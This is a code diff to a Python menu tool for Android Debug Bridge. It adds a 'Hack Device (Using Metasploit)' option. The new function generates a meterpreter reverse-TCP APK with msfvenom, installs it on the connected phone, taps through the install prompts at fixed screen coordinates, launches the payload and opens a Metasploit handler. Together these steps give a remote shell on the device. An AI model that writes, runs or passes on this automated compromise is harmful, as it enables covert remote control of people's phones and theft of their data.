@@ -1,5 +1,7 @@
 import os
 import random
+import socket
+import time
 from banner import banner_list
 
 
@@ -12,7 +14,7 @@ def display_menu():
     2. List connected devices       7. List installed apps           12. Uninstall an app   
     3. Disconnect all devices       8. Download file from device     13. Screen Record     
     4. Access device shell          9. Send file to device           14. Restart device
-    5. Stop ADB server             10. Install an APK                 
+    5. Stop ADB server             10. Install an APK                15. Hack Device (Using Metasploit)
     
     '''
     print(menu)
@@ -136,6 +138,30 @@ def reboot():
     os.system('adb reboot')
     print('\n')
 
+def get_ip_address():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    return s.getsockname()[0]
+
+def hack():
+    print(f"\nHACKING DEVICE...\n")
+    ip = get_ip_address()
+    print(f"\nUsing IP Address : {ip}\n") 
+    print("\nCreating APK...\n") 
+    os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 > test.apk")
+    print("\nInstalling APK to target device...\n")
+    os.system("adb install test.apk &")
+    time.sleep(5)
+    print("\n Sending touch 1\n")
+    os.system('adb shell input tap 560 1435')
+    print("\nLaunching app...\n")
+    package_name = "com.metasploit.stage"
+    os.system("adb shell monkey -p " + package_name + " 1")    
+    time.sleep(3)
+    print("\n Sending touch 2\n")
+    os.system('adb shell input tap 1015 2165')
+    os.system(f"msfconsole -x 'use exploit/multi/handler ; set PAYLOAD android/meterpreter/reverse_tcp ; set LHOST {ip} ; set LPORT 4444 ; exploit'" )
+
 
 def main():
 
@@ -177,6 +203,8 @@ def main():
             screenrecord()
         case 14:
             reboot()
+        case 15:
+            hack()
         case other:
             print("\nInvalid selection!\n")
 
